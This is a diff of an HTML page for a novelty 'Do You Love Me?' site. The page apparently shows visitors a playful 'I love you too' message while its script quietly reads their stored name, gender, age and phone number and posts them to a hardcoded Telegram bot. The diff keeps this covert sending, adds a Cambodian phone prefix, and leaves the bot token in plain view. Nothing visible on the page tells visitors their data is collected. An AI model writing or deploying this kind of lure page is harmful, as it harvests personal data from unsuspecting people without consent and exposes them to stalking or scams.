@@ -13,92 +13,87 @@
   </head>
   <body>
     <div class="container">
-            <div class="header">
-              <img
-                src="https://cdn.pixabay.com/photo/2022/01/07/20/45/love-6922640_1280.png"
-                alt="Love Icon"
-              />
-            </div>
-      <div >
-        <h1 class="message" id="message">
-            
-        </h1>
+      <div class="header">
+        <img
+          src="https://cdn.pixabay.com/photo/2022/01/07/20/45/love-6922640_1280.png"
+          alt="Love Icon"
+        />
       </div>
+      <div>
+        <h1 class="message" id="message"></h1>
       </div>
     </div>
     <footer>
-        <p>&copy; 2023 Do You Love Me? All rights reserved.</p>
-        <a href="privacy.html">Privacy Policy</a> |
-        <a href="terms.html">Terms & Conditions</a>
-      </p>
+      <p>&copy; 2023 Do You Love Me? All rights reserved.</p>
+      <a href="privacy.html">Privacy Policy</a> |
+      <a href="terms.html">Terms & Conditions</a>
     </footer>
-  </body>
-  <script >
-    
-     
-     
-     // Retrieve user data from localStorage
-     const userData = JSON.parse(localStorage.getItem("userData"));
+    <script>
+      // Retrieve user data from localStorage
+      const userData = JSON.parse(localStorage.getItem("userData"));
 
-if (userData) {
-  // Display personalized message
-  const messageElement = document.getElementById("message");
-  if (messageElement) {
-    messageElement.textContent = `I love you too, ${userData.username} :   ${userData.age}Years ago`;
-  } else {
-    console.error("Message element not found!");
-  }
+      if (userData) {
+        // Display personalized message
+        const messageElement = document.getElementById("message");
+        if (messageElement) {
+          messageElement.textContent = `I love you too, ${userData.username} (${userData.age} years old)!`;
+        } else {
+          console.error("Message element not found!");
+        }
 
-  // Send data to Telegram bot
-  const telegramBotToken =
-    "7893506126:AAEfbbIrs6rRgIpchTgZjp9iT1zHXpo5UMg"; // Replace with your bot token
-  const chatId = "1208908312"; // Replace with your chat ID (ensure it's numeric)
-  const message = `Informations: User \nName: ${userData.username}\nGender:  ${userData.gender}\nAge: ${userData.age}\nPhone: ${userData.phone}`;
+        // Prefix the phone number with +855
+        const formattedPhone = "+855" + userData.phone;
 
-  fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-    },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: message +  " \nText : " + messageElement.textContent, // br
-      
-      reply_markup: JSON.stringify({
-        inline_keyboard: [
-          [
-            {
-              text: "❤️ Love ❤️", // click love button please search telegram with number phone
-              url: `https://t.me/${userData.phone}`,
-            },
-          ],
-        ],
-      }),
-      parse_mode: "HTML",
-      disable_web_page_preview: true,
-      disable_notification: false,
-    }),
-  })
-    .then((response) => {
-      if (!response.ok) {
-        return response.json().then((errorData) => {
-          throw new Error(`Telegram API error: ${errorData.description}`);
-        });
+        // Send data to Telegram bot
+        const telegramBotToken =
+          "7893506126:AAEfbbIrs6rRgIpchTgZjp9iT1zHXpo5UMg"; // Replace with your bot token
+        const chatId = "1208908312"; // Replace with your chat ID (ensure it's numeric)
+        const message = `Informations:\nName: ${userData.username}\nGender: ${userData.gender}\nAge: ${userData.age}\nPhone: ${formattedPhone}`;
+
+        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            reply_markup: JSON.stringify({
+              inline_keyboard: [
+                [
+                  {
+                    text: "❤️ Love ❤️", // Clicking this button opens Telegram with the formatted phone number
+                    url: `https://t.me/${formattedPhone}`,
+                  },
+                ],
+              ],
+            }),
+            parse_mode: "HTML",
+            disable_web_page_preview: true,
+            disable_notification: false,
+          }),
+        })
+          .then((response) => {
+            if (!response.ok) {
+              return response.json().then((errorData) => {
+                throw new Error(`Telegram API error: ${errorData.description}`);
+              });
+            }
+            console.log("Message sent successfully to Telegram bot.");
+          })
+          .catch((error) => {
+            console.error("Error sending message to Telegram bot:", error);
+          });
+      } else {
+        // Handle case where no user data is found
+        const messageElement = document.getElementById("message");
+        if (messageElement) {
+          messageElement.textContent =
+            "No user data found. Please go back and fill out the form.";
+        } else {
+          console.error("Message element not found!");
+        }
       }
-      console.log("Message sent successfully to Telegram bot.");
-    })
-    .catch((error) => {
-      console.error("Error sending message to Telegram bot:", error);
-    });
-} else {
-  // Handle case where no user data is found
-  const messageElement = document.getElementById("message");
-  if (messageElement) {
-    messageElement.textContent =
-      "No user data found. Please go back and fill out the form.";
-  } else {
-    console.error("Message element not found!");
-  }
-}
-  </script>
+    </script>
+  </body>
 </html>
